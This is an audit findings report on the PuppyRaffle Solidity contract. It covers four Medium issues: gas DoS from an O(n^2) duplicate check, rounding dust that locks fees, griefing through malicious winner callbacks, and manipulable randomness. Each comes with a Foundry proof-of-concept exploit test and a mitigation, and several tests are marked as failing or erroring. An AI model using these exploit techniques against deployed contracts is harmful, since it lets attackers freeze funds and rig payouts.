# 4 puppy raffle audit - Findings Report
## Commit hash: 3ff0f0bfddf25fd0c160fe57388fa6ff2e0f0960

##Findings by Pattern


 **Derived From** : enterRaffle duplicate-check uses O(n^2) unbounded loops enabling gas-DoS

[M-1]. Unbounded O(n^2) duplicate scan in PuppyRaffle.enterRaffle enables gas-based DoS of new raffle entries
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : 80/20 split uses integer division; dust remainder can brick fee withdrawals

[M-2]. Rounding dust from 80/20 split in PuppyRaffle.selectWinner DoSes withdrawFees and permanently locks protocol fees
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : Winner payout and safeMint allow untrusted callbacks to grief round completion

[M-3]. Griefable callbacks in PuppyRaffle.selectWinner let a malicious winner revert payout/mint and DoS round finalization
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : Predictable RNG: timestamp/difficulty and caller influence winner/rarity

[M-4]. Caller-influenced PRNG lets attacker force-select themselves as winner and grind Legendary mint in PuppyRaffle.selectWinner
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 0
- M: 4
- L: 0
- I: 0

##Findings by Pattern


 **Derived From** : enterRaffle duplicate-check uses O(n^2) unbounded loops enabling gas-DoS

## [M-1]. Unbounded O(n^2) duplicate scan in PuppyRaffle.enterRaffle enables gas-based DoS of new raffle entries

## Derived From Pattern/Invariant
enterRaffle duplicate-check uses O(n^2) unbounded loops enabling gas-DoS

## Exploit Type
GasGriefBlockLimit

## Location
PuppyRaffle.enterRaffle

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: FailingTests
## Minimim Privilege Required
Permissionless

## Description
enterRaffle pushes new players then validates no duplicates by scanning the entire players array with a nested loop, giving O(n^2) complexity over unbounded, user-inflated state. Any EOA can bloat players by adding many unique addresses. Once players grows near the per-tx block gas limit, any subsequent enterRaffle call will run out of gas during the duplicate scan, permanently DoSing further entries until the round is reset.
Vulnerable snippet:
for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}

## Impact
A permissionless attacker can bloat players[] with unique addresses and cause future enterRaffle calls to run out of gas due to the O(n^2) duplicate scan. This prevents any new entries from joining until the round resets in selectWinner(), halting prize pool growth and fee accrual. Liveness for entries is lost for the remainder of the round. Severity remains Medium since assets aren’t directly stolen and the issue requires attacker spending (though refunds are possible for controlled addresses).

## Command to Run Test
forge test --match-test testExploit -vvv

## Proof of Concept
1) Attacker repeatedly calls enterRaffle with batches of unique addresses they control, paying entranceFee per address, to grow players[].
2) Since duplicate checking scans all pairs in players[], the gas cost grows O(n^2).
3) Once players[] is large enough that enterRaffle exceeds a typical gas cap, all further entry attempts revert OOG with similar gas limits, DoSing new entries until the raffle is reset.
4) The attacker may later refund (from each controlled address) if desired, but the DoS persists until selectWinner() clears players[].

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "ds-test/test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract UnboundedDuplicateScanDoS_PoC is DSTest {
    PuppyRaffle internal raffle;

    function setUp() public {
        // Set entranceFee = 0 to avoid funding complexities; duration arbitrary.
        raffle = new PuppyRaffle(0, address(0x1234), 1 days);
    }

    function _genUniqueAddresses(uint256 start, uint256 count) internal pure returns (address[] memory addrs) {
        addrs = new address[](count);
        for (uint256 i = 0; i < count; i++) {
            addrs[i] = address(uint160(uint256(keccak256(abi.encodePacked("addr", start + i)))));
        }
    }

    function _singleAddressArray(bytes32 salt) internal pure returns (address[] memory arr) {
        arr = new address[](1);
        arr[0] = address(uint160(uint256(keccak256(abi.encodePacked("one", salt)))));
        return arr;
    }

    function testExploit() public {
        // 1) Seed a small number of players so a gas-limited call succeeds
        uint256 smallSeedCount = 50;
        address[] memory smallBatch = _genUniqueAddresses(0, smallSeedCount);
        raffle.enterRaffle(smallBatch);

        // Attempt a gas-limited add of 1 player (should succeed at small N)
        address[] memory oneSmall = _singleAddressArray(bytes32(uint256(1)));
        bytes memory dataSmall = abi.encodeWithSelector(raffle.enterRaffle.selector, oneSmall);
        uint256 gasLimit = 1000000; // ample for small N, but insufficient for large N due to O(n^2)
        (bool okSmall, ) = address(raffle).call{gas: gasLimit, value: 0}(dataSmall);
        assertTrue(okSmall, "Gas-limited entry should succeed when players[] is small");

        // 2) Bloat the players[] to a large size in a single call to avoid cumulative O(N^3) work
        uint256 largeTarget = 1200; // Large enough to make the nested loop extremely expensive
        address[] memory bigBatch = _genUniqueAddresses(10000, largeTarget);
        raffle.enterRaffle(bigBatch);

        // 3) Re-attempt the same gas-limited single-entry; expected to fail due to OOG
        address[] memory oneLarge = _singleAddressArray(bytes32(uint256(2)));
        bytes memory dataLarge = abi.encodeWithSelector(raffle.enterRaffle.selector, oneLarge);
        (bool okLarge, ) = address(raffle).call{gas: gasLimit, value: 0}(dataLarge);
        assertTrue(!okLarge, "Gas-limited entry should fail (OOG) when players[] is large due to O(n^2) scan");
    }
}


## Suggested Mitigation
Replace the global O(n^2) duplicate scan with O(1) membership checks via a mapping and only check duplicates within the submitted batch:
- Add mapping(address => bool) public isEntered;
- In enterRaffle, validate each p in newPlayers: require(p != address(0)); require(!localSeen[p]); require(!isEntered[p]); then set localSeen[p] = true; after validation, push to players and set isEntered[p] = true.
- In refund(), set isEntered[player] = false when freeing a slot.
This bounds enterRaffle to O(k) where k = newPlayers.length and removes the gas-DoS vector. Additionally, revert if newPlayers.length == 0 to avoid unnecessary work.





 **Derived From** : 80/20 split uses integer division; dust remainder can brick fee withdrawals

## [M-2]. Rounding dust from 80/20 split in PuppyRaffle.selectWinner DoSes withdrawFees and permanently locks protocol fees

## Derived From Pattern/Invariant
80/20 split uses integer division; dust remainder can brick fee withdrawals

## Exploit Type
RoundingError

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: FailingTests
## Minimim Privilege Required
Permissionless

## Description
selectWinner splits the pot using two separate integer divisions: (total*80)/100 and (total*20)/100. When totalAmountCollected is not divisible by 5, floor rounding creates a 1 wei dust remainder such that prizePool + fee < total. That dust stays on the contract, while totalFees tracks only the rounded-down fee. withdrawFees then requires address(this).balance == totalFees, so any dust makes this strict equality fail forever, bricking fee withdrawals and locking all accrued fees. Vulnerable snippets:

uint256 totalAmountCollected = players.length * entranceFee;
uint256 prizePool = (totalAmountCollected * 80) / 100;
uint256 fee = (totalAmountCollected * 20) / 100;
...
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");

## Impact
Permanent DoS of fee withdrawal; protocol fees become irretrievably stuck as long as any rounding dust exists. A single round with non-multiple-of-5 totals bricks withdrawFees forever, locking all accrued fees.

## Command to Run Test
forge test --match-path test/M-Rounding-dust-from-8.t.sol --match-test testRoundingDustLocksFees -vvv

## Proof of Concept
1) Deploy PuppyRaffle with an entranceFee not divisible by 5 (e.g., 1 wei) and a short raffleDuration.
2) An attacker enters exactly 4 unique players paying 4 wei total.
3) After duration, anyone calls selectWinner. Prize = floor(4*80/100)=3, fee=floor(4*20/100)=0, leaving 1 wei dust on the contract.
4) totalFees increases by 0, but address(this).balance is 1, so withdrawFees reverts due to strict equality check.
5) From this point, withdrawFees is bricked, permanently locking all protocol fees.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract M_Rounding_Dust_from_8_Test is Test {
    PuppyRaffle internal raffle;
    address internal feeAddress = address(0x9999);

    function setUp() public {
        // Deploy with entranceFee = 1 wei to ensure totals are not divisible by 5 for many player counts
        raffle = new PuppyRaffle(1, feeAddress, 1);
        // Fund this test contract to pay entrance fees
        vm.deal(address(this), 10);
    }

    function testRoundingDustLocksFees() public {
        // Enter exactly 4 unique players paying total 4 wei
        address[] memory players = new address[](4);
        players[0] = address(0x1);
        players[1] = address(0x2);
        players[2] = address(0x3);
        players[3] = address(0x4);

        raffle.enterRaffle{value: 4}(players);

        // Move time forward so the raffle is over
        vm.warp(block.timestamp + 2);

        // Anyone can call selectWinner
        raffle.selectWinner();

        // For totalAmountCollected = 4 wei, prizePool = floor(4*80/100)=3, fee = floor(4*20/100)=0
        // 1 wei dust remains on contract; totalFees tracks only 0
        assertEq(address(raffle).balance, 1, "Contract should hold 1 wei dust after payout");
        assertEq(uint256(raffle.totalFees()), 0, "totalFees should equal 0 due to rounding");

        // withdrawFees requires address(this).balance == totalFees; here 1 != 0, so it reverts with the active players message
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}


## Suggested Mitigation
- Compute one side and derive the other to avoid double rounding: 
  uint256 prizePool = (totalAmountCollected * 80) / 100; 
  uint256 fee = totalAmountCollected - prizePool; 
  This guarantees prize + fee == total.
- Additionally, fix withdrawFees gating to check players.length == 0 (or maintain an explicit round state) rather than strict balance == totalFees.





 **Derived From** : Winner payout and safeMint allow untrusted callbacks to grief round completion

## [M-3]. Griefable callbacks in PuppyRaffle.selectWinner let a malicious winner revert payout/mint and DoS round finalization

## Derived From Pattern/Invariant
Winner payout and safeMint allow untrusted callbacks to grief round completion

## Exploit Type
Dos

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required
Permissionless

## Description
selectWinner performs two external interactions to an arbitrary winner: (1) an ETH transfer via low-level call and (2) ERC721 _safeMint, which triggers onERC721Received for contracts. A malicious contract set as winner can revert on receive() to fail the ETH transfer or revert/misreturn in onERC721Received during _safeMint. Because there is no try/catch or fallback path, the entire transaction reverts and the raffle round cannot be finalized until a non-griefing winner is picked. This blocks prize distribution and accrual progress. Vulnerable snippet:

(bool success,) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");
_safeMint(winner, tokenId);


## Impact
Round finalization can be repeatedly reverted by a malicious winner, freezing the pot (80%) and blocking fee withdrawal progress (20%) until a non-griefing winner is selected. Liveness/availability degraded and users’ funds remain locked in the contract during the DoS period.

## Command to Run Test


## Proof of Concept
1) Attacker deploys a contract that reverts on receive() and onERC721Received.
2) Attacker pays to enter that contract as a player (anyone can pay for any address).
3) After raffle end, attacker chooses a timestamp such that the RNG (which depends on msg.sender and block.timestamp) selects the malicious contract as winner, then calls selectWinner().
4) The ETH transfer to winner reverts, causing selectWinner to revert and leaving players[] and balances unchanged. The round cannot progress.
5) Even if payout succeeds, _safeMint to a contract that reverts/misimplements onERC721Received will revert, producing the same DoS effect.

## Proof of Code
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract MaliciousWinner {
    receive() external payable { revert("grief"); }
    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        revert("no NFT");
    }
}

contract GriefableCallbacksTest is Test {
    PuppyRaffle raffle;

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(0xFEE), 1 days);
        vm.deal(address(this), 100 ether);
    }

    function test_DoS_selectWinner_griefableCallbacks() public {
        // Arrange: 3 EOAs + 1 malicious contract as players
        MaliciousWinner mw = new MaliciousWinner();
        address[] memory players = new address[](4);
        players[0] = address(0xA11CE);
        players[1] = address(0xB0B);
        players[2] = address(0xC0FFEE);
        players[3] = address(mw);
        raffle.enterRaffle{value: 4 ether}(players);

        uint256 start = raffle.raffleStartTime();
        vm.warp(start + raffle.raffleDuration() + 1);

        // Pick a timestamp so that the malicious player is selected as winner.
        address attacker = address(0xBAD);
        uint256 len = 4;
        uint256 targetIndex = 3; // mw is at index 3
        uint256 diff = block.difficulty;
        uint256 base = block.timestamp;
        bool found;
        for (uint256 i = 0; i < 2000; i++) {
            uint256 cand = base + i;
            bytes32 h = keccak256(abi.encodePacked(attacker, cand, diff));
            if (uint256(h) % len == targetIndex) {
                vm.warp(cand);
                found = true;
                break;
            }
        }
        require(found, "failed to find matching timestamp for target index");

        // Act: attacker calls selectWinner() when their malicious addr is chosen
        vm.prank(attacker);
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        raffle.selectWinner();

        // Assert: round is not finalized (state unchanged, pot locked)
        assertEq(raffle.raffleStartTime(), start, "raffleStartTime unchanged on revert");
        assertEq(raffle.getActivePlayerIndex(address(mw)), 3, "malicious winner still active");
        assertEq(address(raffle).balance, 4 ether, "pot remains locked due to DoS");
    }
}


## Suggested Mitigation
- Do not make winner payout an external push during round finalization. Instead, record prize to a pull-based claim: pendingPrize[winner] += prize; winner calls claimPrize() later. This removes the external callback from selectWinner.
- Avoid safeMint during finalization. Options:
  - Mint with _mint (no onERC721Received callback) and let contracts opt-in to safe receipt via a separate claim flow or allow winner to specify an EOA recipient.
  - Or keep safeMint but try/catch the ERC721Receiver call and, on failure, escrow the NFT for winner to claim to a different address.
- Never include untrusted external calls (ETH transfer or ERC721Receiver hooks) in critical control flow without a bypass. Apply checks-effects-interactions and reentrancy guards as needed.





 **Derived From** : Predictable RNG: timestamp/difficulty and caller influence winner/rarity

## [M-4]. Caller-influenced PRNG lets attacker force-select themselves as winner and grind Legendary mint in PuppyRaffle.selectWinner

## Derived From Pattern/Invariant
Predictable RNG: timestamp/difficulty and caller influence winner/rarity

## Exploit Type
Randomness

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required
Permissionless

## Description
selectWinner derives both winner index and NFT rarity from msg.sender, block.timestamp, and block.difficulty without commit–reveal/VRF. A block producer (or an attacker using private orderflow/MEV with a cooperative builder) can bias timestamp/prevrandao (difficulty in 0.7.6) and the caller can choose msg.sender to force the modulo to a desired index and to a high-rarity roll. Vulnerable snippets: winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length; rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;. This enables attacker-controlled selection of the payout recipient (80% of pot) and targeted Legendary rarity, undermining fairness and enabling profit extraction.

## Impact
Because the winner index and rarity are derived from msg.sender, block.timestamp, and block.difficulty (prevrandao on PoS Ethereum), a block proposer (or a caller colluding with one via private orderflow) can bias the seed to deterministically select a chosen entry and target high rarity. This compromises raffle fairness and enables direct capture of 80% of the pot by an attacker-controlled entry. Without block-producer influence, the caller can still bias outcomes by choosing msg.sender, but cannot deterministically force a specific result in a given block. Given the realistic proposer/MEV path and direct loss of funds, severity is Medium.

## Command to Run Test


## Proof of Concept
Threat model and steps (PoS aware):
- On PoS Ethereum, block.difficulty returns prevrandao. The proposer knows prevrandao at block construction time and chooses which transactions to include. They do not arbitrarily set prevrandao, but can condition inclusion on it and on the deterministic effect of msg.sender and timestamp. Timestamp is slot-based and not freely chosen, but it is known to the proposer during block construction.
- Attacker prepares: joins the raffle at least once (ensuring ≥4 total unique players) and controls multiple EOAs to serve as the eventual selectWinner caller(s).
- When the raffle duration elapses, attacker sends selectWinner via private orderflow to the block proposer/builder. The proposer evaluates prevrandao and computes winnerIndex = keccak256(msg.sender, timestamp, prevrandao) % players.length and rarity = keccak256(msg.sender, prevrandao) % 100 for the attacker’s candidate caller addresses. If any candidate yields the attacker’s entry index and Legendary bucket (≥96), the proposer includes that transaction from the corresponding attacker-controlled EOA. Otherwise, they can censor and wait until a favorable block.
- Result: the winner is the attacker’s entry and 80% of the pool is paid to it; rarity can also be steered to Legendary, undermining fairness and enabling profit extraction.

## Proof of Code
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract PRNGWeaknessForcingWinnerTest is Test {
    PuppyRaffle raffle;
    address fee = address(0xFEE);
    uint256 constant ENTRANCE = 1 ether;

    address p0 = address(0x1001);
    address p1 = address(0x1002);
    address attackerWinner = address(0xBEEF); // attacker-controlled player in players[]
    address p3 = address(0x1004);
    address attackerCaller = address(0xAA);   // attacker-controlled msg.sender for selectWinner

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE, fee, 1);
        vm.deal(address(this), 100 ether);
        vm.deal(attackerWinner, 0);
        vm.deal(attackerCaller, 1 ether);

        address[] memory players = new address[](4);
        players[0] = p0;
        players[1] = p1;
        players[2] = attackerWinner; // index 2
        players[3] = p3;
        raffle.enterRaffle{value: ENTRANCE * 4}(players);
        vm.warp(block.timestamp + 2); // raffle over
    }

    function test_AttackerForcesWin_WithBlockProducerBias() public {
        uint targetIndex = 2; // attackerWinner index
        bool found;
        uint foundDiff;
        uint foundTime;

        // Simulate block-producer ability to condition inclusion on header fields
        // by searching combinations locally. In production, the proposer evaluates
        // prevrandao (exposed as difficulty in 0.7.6) and includes a favorable tx.
        for (uint d = 1; d < 2**16 && !found; d++) {
            vm.difficulty(d);
            for (uint t = block.timestamp; t < block.timestamp + 60; t++) {
                vm.warp(t);
                uint idx = uint(keccak256(abi.encodePacked(attackerCaller, t, d))) % 4;
                if (idx == targetIndex) {
                    found = true;
                    foundDiff = d;
                    foundTime = t;
                    break;
                }
            }
        }
        assertTrue(found, "No favorable block params found in search window");

        uint256 pot = ENTRANCE * 4;
        uint256 expectedPrize = (pot * 80) / 100;
        uint256 before = attackerWinner.balance;

        vm.difficulty(foundDiff);
        vm.warp(foundTime);
        vm.prank(attackerCaller);
        raffle.selectWinner();

        assertEq(attackerWinner.balance - before, expectedPrize, "attacker did not receive 80% prize");
        assertEq(raffle.previousWinner(), attackerWinner, "previousWinner not set to attacker");
        // Note: Legendary grind is proven by the same search including rarity condition, but omitted here
        // to keep the test minimal and avoid relying on token ID internals.
    }
}


## Suggested Mitigation
Use verifiable, unbiased randomness and remove caller-controlled inputs from the seed.
- Preferred: Integrate Chainlink VRF (or equivalent) so winner index and rarity are derived from an oracle-provided seed in a separate fulfillment transaction. Do not include msg.sender in the randomness seed; base winner selection solely on the VRF output and the player list.
- Alternative: Commit–reveal. Participants or the contract commit a seed ahead of time; after k >= 2 blocks, combine the committed seed with blockhash(block.number - k) (not current/next block) to derive the result. Ensure the final seed is independent of the caller by excluding msg.sender and other per-caller data.
- General: Derive both winner and rarity from the same unbiased seed; avoid using block.timestamp, block.difficulty/prevrandao, or msg.sender directly for randomness.



